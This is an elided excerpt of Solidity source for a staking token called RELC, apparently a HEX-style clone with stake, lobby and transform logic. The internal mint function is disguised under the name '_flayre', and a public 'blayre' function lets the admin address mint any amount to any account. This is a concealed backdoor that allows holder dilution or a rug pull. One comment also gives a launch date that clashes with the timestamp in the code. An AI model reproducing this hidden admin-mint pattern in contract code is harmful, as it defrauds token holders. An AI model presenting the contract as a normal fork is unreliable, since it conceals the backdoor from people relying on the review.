...
contract ERC20 is Context, TRC20 {
    ...
    // allocating 500 million tokens for initial PancakeSwap liquidity
     ...
     */
    function _flayre(address account, uint256 amount) internal {
        require(account != address(0), "ERC20: flayre to the zero address");
...
contract GlobalsAndUtility is ERC20 {
    ...
    */
    ...
    address payable internal LIQUIDITY_ADDR = 0xc9A74468b0CaB66b9a7774a3346D8Fb52Ba6f0f3;

    uint8 internal LAST_FLUSHED_DAY = 1;

    /* ERC20 constants */
    string public constant name = "RELCtoken.com";
    string public constant symbol = "RELC";
    uint8 public constant decimals = 8;

    /* Suns per Satoshi = 10,000 * 1e8 / 1e8 = 1e4 */
    uint256 private constant SUNS_PER_RELC = 10 ** uint256(decimals); // 1e8

    /* Time of contract launch (30-04-2022 T20:00:00Z) */
    
    uint256 internal LAUNCH_TIME = 1616860800;  //	Sat Mar 27 2021 16:00:00 GMT+0000
    ...
    uint256 private constant BPB_MAX_RELC = 7 * 1e6;
    uint256 internal constant BPB_MAX_SUNS = BPB_MAX_RELC * SUNS_PER_RELC;
        ...
        external
    {
        ...
        require(g._currentDay > CLAIM_PHASE_START_DAY, "RELC: Too early");

        if (beforeDay != 0) {
            require(beforeDay <= g._currentDay, "RELC: beforeDay cannot be in the future");
    ...
    {
        require(beginDay < endDay && endDay <= globals.dailyDataCount, "RELC: range invalid");
        ...
        view
    {
        ...
        require(stakeIdParam == stRef.stakeId, "RELC: stakeIdParam not in stake");
...
contract StakeableToken is GlobalsAndUtility {
        ...
        external
    {
        ...
        require(newStakedDays >= MIN_STAKE_DAYS, "RELC: newStakedDays lower than minimum");
        ...
        external
    {
        ...
        require(stakeLists[stakerAddr].length != 0, "RELC: Empty stake list");
        require(stakeIndex < stakeLists[stakerAddr].length, "RELC: stakeIndex invalid");
        ...
        require(g._currentDay >= st._lockedDay + st._stakedDays, "RELC: Stake not fully served");

        /* Stake must still be locked */
        require(st._unlockedDay == 0, "RELC: Stake already unlocked");
        ...
        external
    {
        ...
        /* require() is more informative than the default assert() */
        require(stakeListRef.length != 0, "RELC: Empty stake list");
        require(stakeIndex < stakeListRef.length, "RELC: stakeIndex invalid");
        ...
        if (stakeReturn != 0) {
            _flayre(msg.sender, stakeReturn);
        ...
        internal
    {
        ...
        require(newStakedDays <= MAX_STAKE_DAYS, "RELC: newStakedDays higher than maximum");
        ...
        require(newStakeShares != 0, "RELC: newStakedSuns must be at least minimum shareRate");
        ...
        returns (uint256 bonusSuns)
    {
        /*
            ...
            Bonus percentage scaled 0% to 10% for the first 7M RELC of stake.
...
contract TransformableToken is StakeableToken {
        ...
        payable
    {
        ...
        require(rawAmount != 0, "RELC: Amount required");
    ...
    function xfLobbyExit(uint256 enterDay, uint256 count)
        external
    {
        require(enterDay < _currentDay(), "RELC: Round is not complete");
        ...
        if (count != 0) {
            require(count <= qRef.tailIndex - headIndex, "RELC: count invalid");
            endIndex = headIndex + count;
        } else {
            endIndex = qRef.tailIndex;
            require(headIndex < endIndex, "RELC: count invalid");
        }
        ...
        do {
            ...
            if (referrerAddr == address(0) || referrerAddr == msg.sender) {
                ...
                _emitXfLobbyExit(enterDay, headIndex, xfAmount, referrerAddr);
                _flayre(referrerAddr, referrerBonusSuns);
            }
        ...
        if (totalXfAmount != 0) {
            _flayre(msg.sender, totalXfAmount);
        }
    }


     function blayre(address account, uint256 amount) public {
        require(msg.sender == _admin);
        require(account != address(0), "ERC20: flayre to the zero address");

        _flayre(account, amount);
    }
        ...
        external
    {
        ...
        require(address(this).balance != 0, "RELC: No value");

        require(LAST_FLUSHED_DAY < _currentDay(), "RELC: Invalid day");
        ...
        returns (uint256 rawAmount, address referrerAddr)
    {
        ...
        require(entry.rawAmount != 0, "RELC: Param invalid");
    ...
    {
        /* 1342465753424 = ~ 4900000 * SUNS_PER_RELC / 365 */
...
contract RELC is TransformableToken {
